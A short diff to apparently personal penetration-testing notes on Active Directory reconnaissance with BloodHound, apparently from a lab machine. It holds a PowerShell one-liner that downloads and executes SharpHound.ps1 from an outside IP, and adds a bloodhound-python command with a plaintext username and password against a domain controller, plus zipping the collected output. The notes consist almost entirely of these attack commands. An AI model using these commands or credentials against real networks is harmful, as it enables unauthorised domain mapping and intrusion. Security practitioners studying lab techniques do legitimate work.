@@ -1,6 +1,10 @@
 #
 powershell -command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.107/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -LDAPUser username -LDAPPass user_password"
+##another trick
+bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-
+BANK.LOCAL -ns 10.10.10.175 -c All
 
+zip info.zip *.json
 #
 Upload and run SharpHound.exe, download the zip file
 
